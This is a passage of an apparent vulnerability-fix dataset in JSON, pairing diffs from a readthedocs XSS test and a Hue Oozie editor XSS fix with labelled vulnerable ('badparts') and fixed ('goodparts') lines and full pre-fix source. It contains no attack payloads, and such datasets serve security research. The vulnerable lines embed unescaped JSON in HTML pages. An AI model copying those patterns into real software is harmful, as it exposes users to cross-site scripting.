test_facted_page_xss(self, client, project):\n         page_search = PageDocument.faceted_search(query=query, user='')\n         results = page_search.execute()\n         expected = \"\"\"\n-        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n+        &lt;h3&gt;<span>XSS</span> exploit&lt;&#x2F;h3&gt;\n         \"\"\".strip()\n \n         hits = results.hits.hits\n", "message": "", "files": {"/readthedocs/search/tests/test_xss.py": {"changes": [{"diff": "\n         page_search = PageDocument.faceted_search(query=query, user='')\n         results = page_search.execute()\n         expected = \"\"\"\n-        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n+        &lt;h3&gt;<span>XSS</span> exploit&lt;&#x2F;h3&gt;\n         \"\"\".strip()\n \n         hits = results.hits.hits\n", "add": 1, "remove": 1, "filename": "/readthedocs/search/tests/test_xss.py", "badparts": ["        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;"], "goodparts": ["        &lt;h3&gt;<span>XSS</span> exploit&lt;&#x2F;h3&gt;"]}], "source": "\nimport pytest from readthedocs.search.documents import PageDocument @pytest.mark.django_db @pytest.mark.search class TestXSS: def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;<em>XSS</em> exploit&lt;& \"\"\".strip() hits=results.hits.hits assert len(hits)==1 inner_hits=hits[0]['inner_hits'] domain_hits=inner_hits['domains']['hits']['hits'] assert len(domain_hits)==0 section_hits=inner_hits['sections']['hits']['hits'] assert len(section_hits)==1 section_content_highlight=section_hits[0]['highlight']['sections.content'] assert len(section_content_highlight)==1 assert expected in section_content_highlight[0] ", "sourceWithComments": "import pytest\n\nfrom readthedocs.search.documents import PageDocument\n\n\n@pytest.mark.django_db\n@pytest.mark.search\nclass TestXSS:\n\n    def test_facted_page_xss(self, client, project):\n        query = 'XSS'\n        page_search = PageDocument.faceted_search(query=query, user='')\n        results = page_search.execute()\n        expected = \"\"\"\n        &lt;h3&gt;<em>XSS</em> exploit&lt;&#x2F;h3&gt;\n        \"\"\".strip()\n\n        hits = results.hits.hits\n        assert len(hits) == 1  # there should be only one result\n\n        inner_hits = hits[0]['inner_hits']\n\n        domain_hits = inner_hits['domains']['hits']['hits']\n        assert len(domain_hits) == 0  # there shouldn't be any results from domains\n\n        section_hits = inner_hits['sections']['hits']['hits']\n        assert len(section_hits) == 1\n\n        section_content_highlight = section_hits[0]['highlight']['sections.content']\n        assert len(section_content_highlight) == 1\n\n        assert expected in section_content_highlight[0]\n"}}, "msg": "fix test_xss"}}, "https://github.com/gethue/hue": {"6641c62beaa1468082e47d82da5ed758d11c7735": {"url": "https://api.github.com/repos/gethue/hue/commits/6641c62beaa1468082e47d82da5ed758d11c7735", "html_url": "https://github.com/gethue/hue/commit/6641c62beaa1468082e47d82da5ed758d11c7735", "sha": "6641c62beaa1468082e47d82da5ed758d11c7735", "keyword": "XSS protect", "diff": "diff --git a/apps/oozie/src/oozie/models2.py b/apps/oozie/src/oozie/models2.py\nindex c9dd546b72..f3f5cce5af 100644\n--- a/apps/oozie/src/oozie/models2.py\n+++ b/apps/oozie/src/oozie/models2.py\n@@ -26,6 +26,7 @@\n from string import Template\n \n from django.utils.encoding import force_unicode\n+from desktop.lib.json_utils import JSONEncoderForHTML\n from django.utils.translation import ugettext as _\n \n from desktop.lib import django_mako\n@@ -1381,14 +1382,13 @@ def id(self):\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')\n     _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\n@@ -1597,13 +1597,12 @@ def id(self):\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\ndiff --git a/apps/oozie/src/oozie/views/editor2.py b/apps/oozie/src/oozie/views/editor2.py\nindex c2b5f66917..215dc77158 100644\n--- a/apps/oozie/src/oozie/views/editor2.py\n+++ b/apps/oozie/src/oozie/views/editor2.py\n@@ -29,6 +29,7 @@\n from desktop.lib.exceptions_renderable import PopupException\n from desktop.lib.i18n import smart_str\n from desktop.lib.rest.http_client import RestException\n+from desktop.lib.json_utils import JSONEncoderForHTML\n from desktop.models import Document, Document2\n \n from liboozie.credentials import Credentials\n@@ -49,7 +50,7 @@ def list_editor_workflows(request):\n   workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n \n   return render('editor/list_editor_workflows.mako', request, {\n-      'workflows_json': json.dumps(workflows)\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)\n   })\n \n \n@@ -82,12 +83,12 @@ def edit_workflow(request):\n     LOG.error(smart_str(e))\n \n   return render('editor/workflow_editor.mako', request, {\n-      'layout_json': json.dumps(workflow_data['layout']),\n-      'workflow_json': json.dumps(workflow_data['workflow']),\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n+      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),\n+      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n-      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n+      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n \n@@ -373,9 +374,9 @@ def edit_coordinator(request):\n     raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n \n   return render('editor/coordinator_editor.mako', request, {\n-      'coordinator_json': coordinator.json,\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflows_json': json.dumps(workflows),\n+      'coordinator_json': coordinator.json_for_html(),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n@@ -497,8 +498,8 @@ def edit_bundle(request):\n                       for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n \n   return render('editor/bundle_editor.mako', request, {\n-      'bundle_json': bundle.json,\n-      'coordinators_json': json.dumps(coordinators),\n+      'bundle_json': bundle.json_for_html(),\n+      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n   })\n", "message": "", "files": {"/apps/oozie/src/oozie/models2.py": {"changes": [{"diff": "\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['start'] = _data['properties']['start'].strftime('%Y-%m-%dT%H:%M:%S')\n     _data['properties']['end'] = _data['properties']['end'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):\n", "add": 2, "remove": 3, "filename": "/apps/oozie/src/oozie/models2.py", "badparts": ["  @property", "  def json(self):", "    return json.dumps(_data)"], "goodparts": ["  def json_for_html(self):", "    return json.dumps(_data, cls=JSONEncoderForHTML)"]}, {"diff": "\n   def uuid(self):\n     return self.document.uuid\n \n-  @property\n-  def json(self):\n+  def json_for_html(self):\n     _data = self.data.copy()\n \n     _data['properties']['kickoff'] = _data['properties']['kickoff'].strftime('%Y-%m-%dT%H:%M:%S')\n \n-    return json.dumps(_data)\n+    return json.dumps(_data, cls=JSONEncoderForHTML)\n  \n   @property\n   def data(self):", "add": 2, "remove": 3, "filename": "/apps/oozie/src/oozie/models2.py", "badparts": ["  @property", "  def json(self):", "    return json.dumps(_data)"], "goodparts": ["  def json_for_html(self):", "    return json.dumps(_data, cls=JSONEncoderForHTML)"]}]}, "/apps/oozie/src/oozie/views/editor2.py": {"changes": [{"diff": "\n   workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n \n   return render('editor/list_editor_workflows.mako', request, {\n-      'workflows_json': json.dumps(workflows)\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)\n   })\n \n \n", "add": 1, "remove": 1, "filename": "/apps/oozie/src/oozie/views/editor2.py", "badparts": ["      'workflows_json': json.dumps(workflows)"], "goodparts": ["      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML)"]}, {"diff": "\n     LOG.error(smart_str(e))\n \n   return render('editor/workflow_editor.mako', request, {\n-      'layout_json': json.dumps(workflow_data['layout']),\n-      'workflow_json': json.dumps(workflow_data['workflow']),\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),\n+      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),\n+      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n-      'subworkflows_json': json.dumps(_get_workflows(request.user)),\n+      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n \n", "add": 5, "remove": 5, "filename": "/apps/oozie/src/oozie/views/editor2.py", "badparts": ["      'layout_json': json.dumps(workflow_data['layout']),", "      'workflow_json': json.dumps(workflow_data['workflow']),", "      'credentials_json': json.dumps(credentials.credentials.keys()),", "      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES),", "      'subworkflows_json': json.dumps(_get_workflows(request.user)),"], "goodparts": ["      'layout_json': json.dumps(workflow_data['layout'], cls=JSONEncoderForHTML),", "      'workflow_json': json.dumps(workflow_data['workflow'], cls=JSONEncoderForHTML),", "      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),", "      'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES, cls=JSONEncoderForHTML),", "      'subworkflows_json': json.dumps(_get_workflows(request.user), cls=JSONEncoderForHTML),"]}, {"diff": "\n     raise PopupException(_('You don\\'t have access to the workflow of this coordinator.'))\n \n   return render('editor/coordinator_editor.mako', request, {\n-      'coordinator_json': coordinator.json,\n-      'credentials_json': json.dumps(credentials.credentials.keys()),\n-      'workflows_json': json.dumps(workflows),\n+      'coordinator_json': coordinator.json_for_html(),\n+      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),\n+      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))\n   })\n", "add": 3, "remove": 3, "filename": "/apps/oozie/src/oozie/views/editor2.py", "badparts": ["      'coordinator_json': coordinator.json,", "      'credentials_json': json.dumps(credentials.credentials.keys()),", "      'workflows_json': json.dumps(workflows),"], "goodparts": ["      'coordinator_json': coordinator.json_for_html(),", "      'credentials_json': json.dumps(credentials.credentials.keys(), cls=JSONEncoderForHTML),", "      'workflows_json': json.dumps(workflows, cls=JSONEncoderForHTML),"]}, {"diff": "\n                       for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')]\n \n   return render('editor/bundle_editor.mako', request, {\n-      'bundle_json': bundle.json,\n-      'coordinators_json': json.dumps(coordinators),\n+      'bundle_json': bundle.json_for_html(),\n+      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),\n       'doc1_id': doc.doc.get().id if doc else -1,\n       'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user))      \n   })\n", "add": 2, "remove": 2, "filename": "/apps/oozie/src/oozie/views/editor2.py", "badparts": ["      'bundle_json': bundle.json,", "      'coordinators_json': json.dumps(coordinators),"], "goodparts": ["      'bundle_json': bundle.json_for_html(),", "      'coordinators_json': json.dumps(coordinators, cls=JSONEncoderForHTML),"]}], "source": "\n import json import logging import uuid from django.core.urlresolvers import reverse from django.forms.formsets import formset_factory from django.http import HttpResponse from django.shortcuts import redirect from django.utils.translation import ugettext as _ from desktop.lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission from oozie.forms import ParameterForm from oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\ find_dollar_variables, find_dollar_braced_variables LOG=logging.getLogger(__name__) def list_editor_workflows(request): workflows=[d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission() def edit_workflow(request): workflow_id=request.GET.get('workflow') if workflow_id: wid={} if workflow_id.isdigit(): wid['id']=workflow_id else: wid['uuid']=workflow_id doc=Document2.objects.get(type='oozie-workflow2', **wid) workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflow_properties_json': json.dumps(WORKFLOW_NODE_PROPERTIES), 'doc1_id': doc.doc.get().id if doc else -1, 'subworkflows_json': json.dumps(_get_workflows(request.user)), 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return edit_workflow(request) def delete_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2.doc.get() doc.can_write_or_exception(request.user) doc.delete() doc2.delete() response={} request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get('layout', '{}')) if workflow.get('id'): workflow_doc=Document2.objects.get(id=workflow['id']) else: workflow_doc=Document2.objects.create(name=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows=[node['properties']['workflow'] for node in workflow['nodes'] if node['type']=='subworkflow-widget'] if subworkflows: dependencies=Document2.objects.filter(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc.save() workflow_instance=Workflow(document=workflow_doc) response['status']=0 response['id']=workflow_doc.id response['doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse(json.dumps(response), mimetype=\"application/json\") def _get_workflows(user): return[{ 'name': workflow.name, 'owner': workflow.owner.username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '{}')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value']) for _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try: node_data=json.loads(request.POST.get('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get('properties',{}).get('script_path',{}) if script_path: script_path=script_path.replace('hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16 * 1024 ** 2) if node_data['type'] in('hive', 'hive2'): parameters=parameters.union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def workflow_parameters(request): response={'status': -1} try: workflow=Workflow(document=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False) except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml']=workflow.to_xml() except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request, doc_id): workflow=Workflow(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=workflow.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if 'Max retries exceeded with url' in str(detail): detail='%s: %s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators(request): coordinators=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/list_editor_coordinators.mako', request,{ 'coordinators': coordinators }) @check_document_access_permission() def edit_coordinator(request): coordinator_id=request.GET.get('coordinator') doc=None if coordinator_id: doc=Document2.objects.get(id=coordinator_id) coordinator=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'], workflows): raise PopupException(_('You don\\'t have access to the workflow of this coordinator.')) return render('editor/coordinator_editor.mako', request,{ 'coordinator_json': coordinator.json, 'credentials_json': json.dumps(credentials.credentials.keys()), 'workflows_json': json.dumps(workflows), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_coordinator(request): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get('coordinator', '{}')) if coordinator_data.get('id'): coordinator_doc=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow']) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status']=0 response['id']=coordinator_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_coordinator(request): response={'status': -1} coordinator_dict=json.loads(request.POST.get('coordinator', '{}')) coordinator=Coordinator(data=coordinator_dict) response['status']=0 response['xml']=coordinator.to_xml() return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_coordinator(request, doc_id): coordinator=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_coordinator(request, coordinator, mapping) request.info(_('Coordinator submitted.')) return redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=coordinator.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc), request.fs, request.jt, mapping).deploy() properties={'wf_application_path': request.fs.get_hdfs_path(wf_dir)} properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get('oozie-error-message', ex)) def list_editor_bundles(request): bundles=[d.content_object for d in Document.objects.get_docs(request.user, Document2, extra='bundle2')] return render('editor/list_editor_bundles.mako', request,{ 'bundles': bundles }) @check_document_access_permission() def edit_bundle(request): bundle_id=request.GET.get('bundle') doc=None if bundle_id: doc=Document2.objects.get(id=bundle_id) bundle=Bundle(document=doc) else: bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators']: dependencies=Document2.objects.filter(type='oozie-coordinator2', uuid__in=[c['coordinator'] for c in bundle_data['coordinators']]) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc.save() response['status']=0 response['id']=bundle_doc.id response['message']=_('Saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_bundle(request, doc_id): bundle=Bundle(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_bundle(request, bundle, mapping) request.info(_('Bundle submitted.')) return redirect(reverse('oozie:list_oozie_bundle', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=bundle.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for c in Document2.objects.filter(type='oozie-coordinator2', uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])]) for i, bundled in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all()[0]) wf_dir=Submission(request.user, workflow, request.fs, request.jt, properties).deploy() deployment_mapping['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update(deployment_mapping) submission=Submission(request.user, bundle, request.fs, request.jt, properties=properties) job_id=submission.run() return job_id except RestException, ex: raise PopupException(_(\"Error submitting bundle %s\") %(bundle,), detail=ex._headers.get('oozie-error-message', ex)) ", "sourceWithComments": "#!/usr/bin/env python\n# Licensed to Cloudera, Inc. under one\n# or more contributor license agreements.  See the NOTICE file\n# distributed with this work for additional information\n# regarding copyright ownership.  Cloudera, Inc. licenses this file\n# to you under the Apache License, Version 2.0 (the\n# \"License\"); you may not use this file except in compliance\n# with the License.  You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport json\nimport logging\nimport uuid\n\nfrom django.core.urlresolvers import reverse\nfrom django.forms.formsets import formset_factory\nfrom django.http import HttpResponse\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\n\nfrom desktop.lib.django_util import render\nfrom desktop.lib.exceptions_renderable import PopupException\nfrom desktop.lib.i18n import smart_str\nfrom desktop.lib.rest.http_client import RestException\nfrom desktop.models import Document, Document2\n\nfrom liboozie.credentials import Credentials\nfrom liboozie.oozie_api import get_oozie\nfrom liboozie.submission2 import Submission\n\nfrom oozie.decorators import check_document_access_permission, check_document_modify_permission\nfrom oozie.forms import ParameterForm\nfrom oozie.models2 import Node, Workflow, Coordinator, Bundle, NODES, WORKFLOW_NODE_PROPERTIES, import_workflows_from_hue_3_7,\\\n    find_dollar_variables, find_dollar_braced_variables\n\n\nLOG = logging.getLogger(__name__)\n\n\n\ndef list_editor_workflows(request):  \n  workflows = [d.content_object.to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')]\n\n  return render('editor/list_editor_workflows.mako', request, {\n      'workflows_json': json.dumps(workflows)\n  })\n\n\n@check_document_access_permission()\ndef edit_workflow(request):\n  workflow_id = request.GET.get('workflow')\n  \n  if workflow_id:\n    wid = {}\n    if workflow_id.isdigit():\n      wid['id'] = workflow_id\n    else:\n      wid['uuid'] = workflow_id\n    doc = Document2.objects.get(type='oozie-workflow2', **wid)\n    workflow = 